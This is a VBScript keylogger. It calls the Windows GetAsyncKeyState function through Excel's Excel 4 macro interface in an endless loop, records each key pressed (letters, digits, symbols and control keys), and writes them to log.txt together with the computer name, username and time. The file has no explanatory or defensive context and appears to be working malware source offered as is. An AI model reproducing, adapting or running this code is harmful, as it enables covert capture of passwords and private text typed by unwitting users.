option explicit
Dim ExcelApp,f,fso,log,conta,datos,shell,api,cmd,may
set fso=createobject("Scripting.FileSystemObject")
Set ExcelApp=CreateObject("Excel.Application") 
Set Shell=CreateObject( "WScript.Shell" )
datos="Computer Name:" & Shell.ExpandEnvironmentStrings("%computername%") & vbcrlf
datos=datos & "Username:" & Shell.ExpandEnvironmentStrings("%username%") & vbcrlf
datos=datos & "Date and Time:" & now & vbcrlf
datos=datos & "==================================================================================================================================================================" & vbcrlf
log=""
conta=0
may=0
While true
   if conta >= 50 then
      conta = 0
      if fso.fileexists("log.txt") then
      fso.deletefile("log.txt")
   end if
      set f=fso.createtextfile("log.txt", True)
   f.write(datos)
   f.write(log)
   f.close
   end if
   conta = conta + 1
   api=0
   log = log & letras(may)
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 32 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 8 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = mid(log,1,len(log)-1)
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 13 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [Enter] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 20 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      if may = 0 then
            may = 1
         else
            may = 0
         end if
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 192 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      if may=0 then
         log = log & "ñ"
      else
       log = log & "Ñ"
   end if
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 190 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & "."
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 188 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & ","
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 32 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & "  "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 9 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [Tab] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 49 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [1/!] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 20 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [Capslock] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 50 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [2/@] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 51 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [3/#] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 52 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [4/$] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 53 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [5/%] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 54 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [6/^] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 55 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [7/&] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 56 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [8/*] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 57 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [9/(] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 48 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [0/)] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 17 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [Ctrl] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 18 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [Alt] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 46 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [Delete] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 45 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [Insert] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 36 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [Home] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 35 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [End] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 34 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [PageDown] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 33 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [PageUp] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 144 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [NumLock] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 111 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [NumDivide] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 106 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [NumMultiply] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 109 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [NumSubtract] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 36 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [Num7] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 38 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [Num8] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 33 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [Num9] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 37 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [Num4] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 12 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [Num5] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 39 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [Num6] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 35 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [Num1] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 40 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [Num2] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 34 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [Num3] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 38 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [Num8] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 45 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [Num0] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 46 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [NumDecimal] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 13 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [NumEnter] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 107 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [NumAdd] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 19 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [Pause] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 145 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [ScrollLock] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 44 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [PrintScreen] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 91 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [Windows] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 27 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [Escape] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 192 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [Backquote] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 189 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [-/_] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 188 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [,/<] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 187 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [=/+] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 190 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [./>] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 191 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [//?] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 186 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [;/:] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 222 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " ['/"+Chr(34)+"] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 219 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [ [/{] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 221 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [] /}] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 220 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [|/\] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 112 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & "F1"
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 113 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & "F2"
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 114 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & "F3"
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 115 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & "F4"
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 116 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & "F5"
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 117 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & "F6"
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 118 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & "F7"
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 119 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & "F8"
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 120 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & "F9"
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 121 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & "F10"
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 122 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & "F11"
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 93 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [ContextMenu] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 38 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [Up] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 40 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [Down] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 37 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [Left] "
      api=0
   end if
   cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 39 & ")"
   api=ExcelApp.ExecuteExcel4Macro(cmd)
   if api<>0 then
      log = log & " [Right] "
      api=0
   end if
wend

function letras(may)
 dim x,api,cmd,digi  
   for x = 65 to 90
      cmd="CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & x & ")"
      api=ExcelApp.ExecuteExcel4Macro(cmd)
      if api<>0 then
         exit for   
      end if
   next
   if x < 91 then
      if may = 0 then
         digi = lcase(chr(x))
      else
         digi = chr(x)
      end if
   end if
   letras = digi
end function
